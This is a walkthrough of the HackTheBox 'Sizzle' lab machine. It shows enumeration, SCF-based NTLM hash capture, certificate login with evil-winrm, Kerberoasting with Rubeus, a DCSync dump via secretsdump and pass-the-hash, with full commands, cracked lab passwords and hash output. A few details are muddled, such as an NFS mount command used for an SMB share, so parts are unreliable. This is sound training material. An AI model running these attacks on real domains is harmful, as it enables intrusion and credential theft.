@@ -1,0 +1,486 @@
+so we began by doing an nmap scan with the following nmap scan command:
+
+
+result=$(nmap -p- --min-rate=1000 -Pn  -T4 10.10.10.103  | grep '^[0-9]' | cut -d '/' -f 1 | tr '\n' ',' | sed 's/,$//' | tr -d '%');nmap -p$result -Pn -sC -sV 10.10.10.103  -oA sizzle
+
+and we get the result as:
+
+# Nmap 7.94 scan initiated Thu Jul 27 11:52:00 2023 as: nmap -p21,53,80,135,139,389,443,445,464,593,636,3268,3269,5985,5986,9389,47001,49664,49665,49666,49669,49677,49686,49687,49689,49692,49698,49707,49713 -Pn -sC -sV -oA sizzle 10.10.10.103
+Nmap scan report for 10.10.10.103
+Host is up (0.23s latency).
+
+PORT      STATE SERVICE       VERSION
+21/tcp    open  ftp           Microsoft ftpd
+|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| ftp-syst: 
+|_  SYST: Windows_NT
+53/tcp    open  domain        Simple DNS Plus
+80/tcp    open  http          Microsoft IIS httpd 10.0
+|_http-server-header: Microsoft-IIS/10.0
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-title: Site doesn't have a title (text/html).
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
+|_ssl-date: 2023-07-27T08:54:37+00:00; +9s from scanner time.
+| ssl-cert: Subject: commonName=sizzle.htb.local
+| Not valid before: 2018-07-03T17:58:55
+|_Not valid after:  2020-07-02T17:58:55
+443/tcp   open  ssl/http      Microsoft IIS httpd 10.0
+|_http-server-header: Microsoft-IIS/10.0
+| ssl-cert: Subject: commonName=sizzle.htb.local
+| Not valid before: 2018-07-03T17:58:55
+|_Not valid after:  2020-07-02T17:58:55
+| tls-alpn: 
+|   h2
+|_  http/1.1
+|_ssl-date: 2023-07-27T08:54:36+00:00; +8s from scanner time.
+| http-methods: 
+|_  Potentially risky methods: TRACE
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=sizzle.htb.local
+| Not valid before: 2018-07-03T17:58:55
+|_Not valid after:  2020-07-02T17:58:55
+|_ssl-date: 2023-07-27T08:54:36+00:00; +8s from scanner time.
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=sizzle.htb.local
+| Not valid before: 2018-07-03T17:58:55
+|_Not valid after:  2020-07-02T17:58:55
+|_ssl-date: 2023-07-27T08:54:37+00:00; +9s from scanner time.
+3269/tcp  open  ssl/ldap
+|_ssl-date: 2023-07-27T08:54:37+00:00; +8s from scanner time.
+| ssl-cert: Subject: commonName=sizzle.htb.local
+| Not valid before: 2018-07-03T17:58:55
+|_Not valid after:  2020-07-02T17:58:55
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+5986/tcp  open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_ssl-date: 2023-07-27T08:54:36+00:00; +8s from scanner time.
+| tls-alpn: 
+|   h2
+|_  http/1.1
+| ssl-cert: Subject: commonName=sizzle.HTB.LOCAL
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:sizzle.HTB.LOCAL
+| Not valid before: 2018-07-02T20:26:23
+|_Not valid after:  2019-07-02T20:26:23
+9389/tcp  open  mc-nmf        .NET Message Framing
+47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+49664/tcp open  msrpc         Microsoft Windows RPC
+49665/tcp open  msrpc         Microsoft Windows RPC
+49666/tcp open  msrpc         Microsoft Windows RPC
+49669/tcp open  msrpc         Microsoft Windows RPC
+49677/tcp open  msrpc         Microsoft Windows RPC
+49686/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49687/tcp open  msrpc         Microsoft Windows RPC
+49689/tcp open  msrpc         Microsoft Windows RPC
+49692/tcp open  msrpc         Microsoft Windows RPC
+49698/tcp open  msrpc         Microsoft Windows RPC
+49707/tcp open  msrpc         Microsoft Windows RPC
+49713/tcp open  msrpc         Microsoft Windows RPC
+Service Info: Host: SIZZLE; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: 8s, deviation: 0s, median: 7s
+| smb2-time: 
+|   date: 2023-07-27T08:53:25
+|_  start_date: 2023-07-27T08:39:34
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled and required
+
+so we enumerate port 21(ftp) and we get nothing... its empty
+
+we continue to dns... try and get the host name and domain name... we get htb.local... 
+
+we go onto port 80.... where the page has a bacon sizzling... it doesn't give us any lead... so we use gobuster with the common.txt wordlist that leans on iis web server... we get the following directories...
+
+gobuster dir -u http://10.10.10.103:80 -w  /usr/share/wordlists/dirb/common.txt  30 
+===============================================================
+Gobuster v3.5
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.10.103:80
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.5
+[+] Timeout:                 10s
+===============================================================
+2023/07/28 16:29:19 Starting gobuster in directory enumeration mode
+===============================================================
+/aspnet_client        (Status: 301) [Size: 160] [--> http://10.10.10.103:80/aspnet_client/]
+/certenroll           (Status: 301) [Size: 157] [--> http://10.10.10.103:80/certenroll/]
+/certsrv              (Status: 401) [Size: 1293]
+/images               (Status: 301) [Size: 153] [--> http://10.10.10.103:80/images/]
+/Images               (Status: 301) [Size: 153] [--> http://10.10.10.103:80/Images/]
+/index.html           (Status: 200) [Size: 60]
+
+
+and we get to see something interesting and that is the /certsrv... its interesting as we see it requires a username and password in order to authenticate... we will take note of that... for certenroll it says that Im fobidden from accessing the web dir
+
+
+so  we continue try to enumerate rpcclient but we get nothing... we can't do anything in there:
+
+rpcclient $> enumdomusers
+result was NT_STATUS_ACCESS_DENIED
+rpcclient $> srvinfo
+do_cmd: Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED
+rpcclient $> querydominfo
+result was NT_STATUS_ACCESS_DENIED
+rpcclient $> netshareenum
+do_cmd: Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED
+rpcclient $> exit
+
+
+so we continue to enumerate... we check port 445(smb) and we log in as a guest user... using smbmap and when we check we see that we have read only access to two shares... i.e Department shares and IPC$
+
+[+] IP: 10.10.10.103:445        Name: sizzle.htb.local                                  
+        Disk                                                    Permissions     Comment
+        ----                                                    -----------     -------
+        ADMIN$                                                  NO ACCESS       Remote Admin
+        C$                                                      NO ACCESS       Default share
+        CertEnroll                                              NO ACCESS       Active Directory Certificate Services share
+        Department Shares                                       READ ONLY
+        IPC$                                                    READ ONLY       Remote IPC
+        NETLOGON                                                NO ACCESS       Logon server share 
+        Operations                                              NO ACCESS
+        SYSVOL                                                  NO ACCESS       Logon server share 
+
+
+so first and foremost we enumerate the Department Shares
+
+we mount it on our computer using:
+
+mount -t nfs -o vers=2 10.10.10.103:'Department Shares' . -o nolock
+
+and now we continue... and use a script to check the paths which are writtable and we find that:
+
+/home/isayar17_x401a/OSCP/HTB/OSCP_Labs/sizzle/share/Users/Public is writable
+/home/isayar17_x401a/OSCP/HTB/OSCP_Labs/sizzle/share/ZZ_ARCHIVE is writable
+
+so we try and do a scf attack---> we create an scf file which when the user clicks on it and 
+
+an scf file is a(Shell Command File) so when a user clicks on it we'll intercept the authentication and steal the ntlm cred then crack it with John
+
+we get the hash as:
+
+amanda::HTB:197e45c821a5a528:AD50A3FA35E13FC29127F64C3CC3EB6C:0101000000000000001452C096C1D901FFB6211C68E4E2B400000000020008004D0058003300460001001E00570049004E002D0055004B0044004E0047004E004F00550032004B00430004003400570049004E002D0055004B0044004E0047004E004F00550032004B0043002E004D005800330046002E004C004F00430041004C00030014004D005800330046002E004C004F00430041004C00050014004D005800330046002E004C004F00430041004C0007000800001452C096C1D9010600040002000000080030003000000000000000010000000020000044B166D7DFC35AEE9FE59889DD10B6D89A318753D6C88EF86C9F1C849B5D112A0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E0032003900000000000000000000000000
+
+and the password as Ashare1972 when cracked....
+
+
+so lets use this creds to see if we can authenticate on other things:
+
+remember that certsvr directory that we saw... maybe we can use the username and password that we have obtained to see if we can maybe access it.
+
+or maybe before that lets see if we can get anything interesting through ftp,rpc,smb then we proceed to the certificate services path...
+
+so we check and we see that 
+
+smbmap -H 10.10.10.103 -u amanda -p "Ashare1972" -d sizzle.htb.local                       
+[+] IP: 10.10.10.103:445        Name: sizzle.htb.local                                  
+        Disk                                                    Permissions     Comment
+        ----                                                    -----------     -------
+        ADMIN$                                                  NO ACCESS       Remote Admin
+        C$                                                      NO ACCESS       Default share
+        CertEnroll                                              READ ONLY       Active Directory Certificate Services share
+        Department Shares                                       READ ONLY
+        IPC$                                                    READ ONLY       Remote IPC
+        NETLOGON                                                READ ONLY       Logon server share 
+        Operations                                              NO ACCESS
+        SYSVOL                                                  READ ONLY       Logon server share 
+
+
+amanda has read access to the CertEnroll dir... its maybe giving us a hint that Amanda has privs when it comes to the certservices... so lets enum further
+
+
+the things in the share are not that interesting:
+
+smbmap -H 10.10.10.103 -u amanda -p "Ashare1972" -d sizzle.htb.local -R CertEnroll
+[+] IP: 10.10.10.103:445        Name: sizzle.htb.local                                  
+        Disk                                                    Permissions     Comment
+        ----                                                    -----------     -------
+        CertEnroll                                              READ ONLY
+        .\CertEnroll\*
+        dr--r--r--                0 Fri Jul 28 15:21:32 2023    .
+        dr--r--r--                0 Fri Jul 28 15:21:32 2023    ..
+        fr--r--r--              721 Fri Jul 28 15:21:32 2023    HTB-SIZZLE-CA+.crl
+        fr--r--r--              909 Fri Jul 28 15:21:31 2023    HTB-SIZZLE-CA.crl
+        fr--r--r--              322 Mon Jul  2 23:36:05 2018    nsrev_HTB-SIZZLE-CA.asp
+        fr--r--r--              871 Mon Jul  2 23:36:03 2018    sizzle.HTB.LOCAL_HTB-SIZZLE-CA.crt
+
+
+so we move on to ftp.... we get nothing... then we move to rpcclient where when we enum for users we get:
+
+
+user:[Administrator] rid:[0x1f4]
+user:[Guest] rid:[0x1f5]
+user:[krbtgt] rid:[0x1f6]
+user:[DefaultAccount] rid:[0x1f7]
+user:[amanda] rid:[0x450]
+user:[mrlky] rid:[0x643]
+user:[sizzler] rid:[0x644]
+
+nice... we got some users... now this is interesting... lets do more enumeration 
+ 
+groups
+group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
+group:[Domain Admins] rid:[0x200]
+group:[Domain Users] rid:[0x201]
+group:[Domain Guests] rid:[0x202]
+group:[Domain Computers] rid:[0x203]
+group:[Domain Controllers] rid:[0x204]
+group:[Schema Admins] rid:[0x206]
+group:[Enterprise Admins] rid:[0x207]
+group:[Group Policy Creator Owners] rid:[0x208]
+group:[Read-only Domain Controllers] rid:[0x209]
+group:[Cloneable Domain Controllers] rid:[0x20a]
+group:[Protected Users] rid:[0x20d]
+group:[Key Admins] rid:[0x20e]
+group:[Enterprise Key Admins] rid:[0x20f]
+group:[DnsUpdateProxy] rid:[0x44f]
+
+yeap... this and more info can be obtained from enumerating rpc... lets login the ad certificate services...
+
+yeap... there is a way to get access through the ad cert services but to do this we have to create our own cert....
+
+openssl genrsa -des3 -out amanda.key 2048 ​# create private key
+
+openssl req -new -key amanda.key -out amanda.csr ​# create csr 
+
+so with our csr(the one we have just created) we copy it and paste it... we go to the request certificate -> advanced certificate and submit it so that we get  a new certificate which we'll use for authentication through evil-winrm:
+
+evil-winrm --ssl --priv-key amanda.key -c certnew.cer -i 10.10.10.103 -u amanda
+
+we enter the passphrase and boom we are in:
+ 
+now we begin enumerating and since we are flexible when it comes to accessing through ldap... we will use bloodhound-python that generates output by querying LDAP...
+
+
+bloodhound-python -d htb.local -u amanda -p 'Ashare1972' -ns 10.10.10.103  -c All    
+INFO: Found AD domain: htb.local
+INFO: Getting TGT for user
+WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (htb.local:88)] [Errno 113] No route to host
+INFO: Connecting to LDAP server: sizzle.HTB.LOCAL
+INFO: Found 1 domains
+INFO: Found 1 domains in the forest
+INFO: Found 1 computers
+INFO: Connecting to LDAP server: sizzle.HTB.LOCAL
+INFO: Found 8 users
+INFO: Found 53 groups
+INFO: Found 2 gpos
+INFO: Found 1 ous
+INFO: Found 19 containers
+INFO: Found 0 trusts
+INFO: Starting computer enumeration with 10 workers
+INFO: Querying computer: sizzle.HTB.LOCAL
+INFO: User guest is logged in on sizzle.HTB.LOCAL from 10.10.14.29
+
+from the bloodhound we see that we are not able to get a TGT.... remember we couldnt see port 88 open... but we highly suspect maybe it might be running internally... lets just use the output that we've got.
+
+on checking the output we find out that mrlky is kerberoastable and also we find out mrlky,sizzler and admin have DCSync rights over the domain controller this is really interesting... when you try to upload a file and execute it over normally it might fail because... of applocker... Applocker blocks applications from being executed based on the policies it has been given... so we continue... and check what paths we have been allowed to execute applications...
+
+we'll use:
+(Get-ApplockerPolicy -Local).RuleCollections
+
+and we see many paths:
+
+
+PublisherConditions : {*\*\*,0.0.0.0-*}
+PublisherExceptions : {}
+PathExceptions      : {}
+HashExceptions      : {}
+Id                  : a9e18c21-ff8f-43cf-b9fc-db40eed693ba
+Name                : (Default Rule) All signed packaged apps
+Description         : Allows members of the Everyone group to run packaged apps that are signed.
+UserOrGroupSid      : S-1-1-0
+Action              : Allow
+
+PathConditions      : {%WINDIR%\*}
+PathExceptions      : {}
+PublisherExceptions : {}
+HashExceptions      : {}
+Id                  : a61c8b2c-a319-4cd0-9690-d2177cad7b51
+Name                : (Default Rule) All files located in the Windows folder
+Description         : Allows members of the Everyone group to run applications that are located in the Windows folder.
+UserOrGroupSid      : S-1-1-0
+Action              : Allow
+
+PathConditions      : {%OSDRIVE%\tmp\*}
+PathExceptions      : {}
+PublisherExceptions : {}
+HashExceptions      : {}
+Id                  : d754b869-d2cc-46af-9c94-6b6e8c10d095
+Name                : All files located in the Program Files folder
+Description         : Allows members of the Everyone group to run applications that are located in the Program Files folder.
+UserOrGroupSid      : S-1-1-0
+Action              : Allow
+
+PathConditions      : {*}
+PathExceptions      : {}
+PublisherExceptions : {}
+HashExceptions      : {}
+Id                  : fd686d83-a829-4351-8ff4-27c7de5755d2
+Name                : (Default Rule) All files
+Description         : Allows members of the local Administrators group to run all applications.
+UserOrGroupSid      : S-1-5-32-544
+Action              : Allow
+
+PublisherConditions : {*\*\*,0.0.0.0-*}
+PublisherExceptions : {}
+PathExceptions      : {}
+HashExceptions      : {}
+Id                  : b7af7102-efde-4369-8a89-7a6a392d1473
+Name                : (Default Rule) All digitally signed Windows Installer files
+Description         : Allows members of the Everyone group to run digitally signed Windows Installer files.
+UserOrGroupSid      : S-1-1-0
+Action              : Allow
+
+PathConditions      : {%WINDIR%\Installer\*}
+PathExceptions      : {}
+PublisherExceptions : {}
+HashExceptions      : {}
+Id                  : 5b290184-345a-4453-b184-45305f6d9a54
+Name                : (Default Rule) All Windows Installer files in %systemdrive%\Windows\Installer
+Description         : Allows members of the Everyone group to run all Windows Installer files located in %systemdrive%\Windows\Installer.
+UserOrGroupSid      : S-1-1-0
+Action              : Allow
+
+PathConditions      : {*.*}
+PathExceptions      : {}
+PublisherExceptions : {}
+HashExceptions      : {}
+Id                  : 64ad46ff-0d71-4fa0-a30b-3f3d30c5433d
+Name                : (Default Rule) All Windows Installer files
+Description         : Allows members of the local Administrators group to run all Windows Installer files.
+UserOrGroupSid      : S-1-5-32-544
+Action              : Allow
+
+PathConditions      : {%PROGRAMFILES%\*}
+PathExceptions      : {}
+PublisherExceptions : {}
+HashExceptions      : {}
+Id                  : 06dce67b-934c-454f-a263-2515c8796a5d
+Name                : (Default Rule) All scripts located in the Program Files folder
+Description         : Allows members of the Everyone group to run scripts that are located in the Program Files folder.
+UserOrGroupSid      : S-1-1-0
+Action              : Allow
+
+PathConditions      : {%WINDIR%\*}
+PathExceptions      : {}
+PublisherExceptions : {}
+HashExceptions      : {}
+Id                  : 9428c672-5fc3-47f4-808a-a0011f36dd2c
+Name                : (Default Rule) All scripts located in the Windows folder
+Description         : Allows members of the Everyone group to run scripts that are located in the Windows folder.
+UserOrGroupSid      : S-1-1-0
+Action              : Allow
+
+PathConditions      : {*}
+PathExceptions      : {}
+PublisherExceptions : {}
+HashExceptions      : {}
+Id                  : ed97d0cb-15ff-430f-b82c-8d7832957725
+Name                : (Default Rule) All scripts
+Description         : Allows members of the local Administrators group to run all scripts.
+UserOrGroupSid      : S-1-5-32-544
+Action              : Allow
+
+after checking with netstat -oat we see that port 88 is listening on the inside so turns out we can do local kerberoasting with rubeus... 
+
+we see that one of the paths where we are allowed to execute files is the /temp dir so we move onto there
+
+
+and download the rubeus file through curl into the victim pc then we execute rubeus
+
+.\r.exe kerberoast /creduser:htb.local\amanda /credpassword:Ashare1972 /nowrap
+
+and we have gotten the tgt belonging to mrlky... 
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.2.0
+
+
+[*] Action: Kerberoasting
+
+[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
+[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.
+
+[*] Target Domain          : HTB.LOCAL
+[*] Searching path 'LDAP://sizzle.HTB.LOCAL/DC=HTB,DC=LOCAL' for '(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'
+
+[*] Total kerberoastable users : 1
+
+
+[*] SamAccountName         : mrlky
+[*] DistinguishedName      : CN=mrlky,CN=Users,DC=HTB,DC=LOCAL
+[*] ServicePrincipalName   : http/sizzle
+[*] PwdLastSet             : 7/10/2018 2:08:09 PM
+[*] Supported ETypes       : RC4_HMAC_DEFAULT
+[*] Hash                   : $krb5tgs$23$*mrlky$HTB.LOCAL$http/sizzle@HTB.LOCAL*$6E7CF550133DC98A6068DC4E84504E44$F82328B63876839A73A19F87EEFD634CE1398313C93EE3EFDFE9E5C4068B3192EBB6C5F2850E134A22F5EC049F0970618C2DBEC31DDAA9EC00B1DC37011F21DBBE6EA3E16716E782AA86C81B854625DE9BC6ECA7BF80BA3CC90DE18FAAD86CA630F71AE4E3008D70C6CA5912F5C72F99A5E78957B3A44F7E7ED1BB9F482861E9BA8D89C4C5DFD75033BB31A729D5526AB99F0622F497337E980F90DFE7BF3C8A2F682C0D7F4A0D254A431FB5911BD609309EB3B5755BC99FA2C9A332FD93CA08A9450344565855B732E16DE79AE09C5232CE1F6D17E46C9E3A176846C1457A4285DFD4129A027A9FA059070431710A49A4872F9AFEB15F3F5C8D38DAC42C440A2BD669D2F4A9C64B74454AE1295EC1FB1AE3208A2BFDDD98548EF1D28ADB1AF371175CE74E78F7ED3C33B680BA6EAD393AA816D1A8B1EF229E91062BA86EB112789E14B1C28DA345CAEFA8C6F324F68C661C12A5D6840DC27BDB634CEB991660AECD70041BF96C851EDC7417EA93BEF15319035CC251F657165C84D86469DE31B17F82C914364121DC92731665ABA8438A6C0F3045086873C40BFEF10F4C11ED78B5E11F1F98852A4C8475134E15591A861174D8D9079ABB1AAA48B3850B184C4FC560CF4F833C420145E0DC22B3A54AEBA31C9B985B938EDEFC2D1AAEBB6AD2F69D576208A721847680ADD767EE0083D83AEBEE171440E14D111CB386CF43877BC8C34A3708E50178F209860250A38A3E124D6931DE5974DEE8E14EC741F8093147C919F7644BB97721B8FFB69836BF7B5CAF624ACB336D8847C00CBDD8E24A74D70AA5B21BB1A8A5C2D61F25286E71D7CEC9E79D84DB4A6CFBD5ED420E4BC03356290642377C3CBEB94A4D9B8401CADA8C72F433D6FAE9D99768668410E04F97D1085A4D8ADCFAFE5A8B268D0C93E2D27A473FBC76B7AB2E5EAC5CE7A8EAB93CECD36E30EB827F5631F450D9DB58BFD53D4ED2A90891B37F27D42995C2973B76A8F2AD35E851629644CB57F2ED9F05BB3275860D2C028EE79D7D715B6573A263824CB9426B76A7D2B5FDA8B1205C11D2CC1B3CD22A438CF37D26B0C3169DCE952EBEAB553B0C33C758E35E606F5DB8C5C232BABF3DD25C4159EF3E970C39FF4E6CF1F016BEA28A97EEABE2BE9E89F8D40C06E971580DB9B44211D392D5600A824CA886CC3BF509B4424EC9E2B257B993B21DB9E4616F04110BE3CD68AC937209D2D4D0D219C384E2CF22B9999026897EA1EA73F413BCB4F4A725A7D3CA130374A008203FB5483C90ECE3F8108FC532D641BC686EA1EB1137BDBB8F673BCD97C462B2CFCC0B34B6A2E77D136C8F4FE7B0C5690A671FF259D2B5DBA1175D16903C8C04353D8E
+
+and we get the password for mrlky as Football#7
+
+now we are gonna have to authenticate  the same way we authenticated with Amanda... by creating a private key... and a csr for her then upload the csr 
+
+evil-winrm --ssl --priv-key mrlky.key -c certnew.cer -i 10.10.10.103 -u mrlky
+
+and boom we are the user mrlky... since we remember that this user also has DCSync we can abuse this using impacket-secretsdump...
+
+when we try to abuse using mimikatz we get detected... 
+
+so we do so using the command:
+impacket-secretsdump -just-dc mrlky:Football#7@10.10.10.103
+
+and we get the hashes:
+
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:f6b7160bfc91823792e0ac3a162c9267:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:296ec447eee58283143efbd5d39408c8:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+amanda:1104:aad3b435b51404eeaad3b435b51404ee:7d0516ea4b6ed084f3fdf71c47d9beb3:::
+mrlky:1603:aad3b435b51404eeaad3b435b51404ee:bceef4f6fe9c026d1d8dec8dce48adef:::
+sizzler:1604:aad3b435b51404eeaad3b435b51404ee:d79f820afad0cbc828d79e16a6f890de:::
+SIZZLE$:1001:aad3b435b51404eeaad3b435b51404ee:46185d0dd0aa3e91baabb86549d7c143:::
+[*] Kerberos keys grabbed
+Administrator:aes256-cts-hmac-sha1-96:e562d64208c7df80b496af280603773ea7d7eeb93ef715392a8258214933275d
+Administrator:aes128-cts-hmac-sha1-96:45b1a7ed336bafe1f1e0c1ab666336b3
+Administrator:des-cbc-md5:ad7afb706715e964
+krbtgt:aes256-cts-hmac-sha1-96:0fcb9a54f68453be5dd01fe555cace13e99def7699b85deda866a71a74e9391e
+krbtgt:aes128-cts-hmac-sha1-96:668b69e6bb7f76fa1bcd3a638e93e699
+krbtgt:des-cbc-md5:866db35eb9ec5173
+amanda:aes256-cts-hmac-sha1-96:60ef71f6446370bab3a52634c3708ed8a0af424fdcb045f3f5fbde5ff05221eb
+amanda:aes128-cts-hmac-sha1-96:48d91184cecdc906ca7a07ccbe42e061
+amanda:des-cbc-md5:70ba677a4c1a2adf
+mrlky:aes256-cts-hmac-sha1-96:b42493c2e8ef350d257e68cc93a155643330c6b5e46a931315c2e23984b11155
+mrlky:aes128-cts-hmac-sha1-96:3daab3d6ea94d236b44083309f4f3db0
+mrlky:des-cbc-md5:02f1a4da0432f7f7
+sizzler:aes256-cts-hmac-sha1-96:85b437e31c055786104b514f98fdf2a520569174cbfc7ba2c895b0f05a7ec81d
+sizzler:aes128-cts-hmac-sha1-96:e31015d07e48c21bbd72955641423955
+sizzler:des-cbc-md5:5d51d30e68d092d9
+SIZZLE$:aes256-cts-hmac-sha1-96:50a10357507a9dbc36c8443a183bcf597d66f9677230687a8ac8faeec742c41a
+SIZZLE$:aes128-cts-hmac-sha1-96:f5697ccd2ab671fa2f4b5081cf183f01
+SIZZLE$:des-cbc-md5:7357ad7acd43202c
+
+then we try to do a pass the hash using crackmapexec and we see that it actually works... 
+
+so using impacket wmiexec we get access and boom we get all flags!
